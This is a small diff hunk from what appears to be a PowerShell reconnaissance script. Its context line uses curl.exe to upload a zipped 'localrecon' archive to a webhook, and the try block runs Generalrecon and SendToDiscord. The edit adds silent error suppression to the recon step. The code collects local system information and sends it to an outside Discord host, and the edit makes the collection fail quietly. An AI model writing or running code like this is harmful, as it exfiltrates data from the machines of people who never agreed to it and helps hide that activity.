@@ -385,7 +385,7 @@ curl.exe -H "Content-Type: multipart/form-data" -F "file1=@localrecon.zip" $WEBH
 
 try {
     pathcheck
-    Generalrecon
+    Generalrecon -ErrorAction SilentlyContinue
     SendToDiscord
 }
 catch {
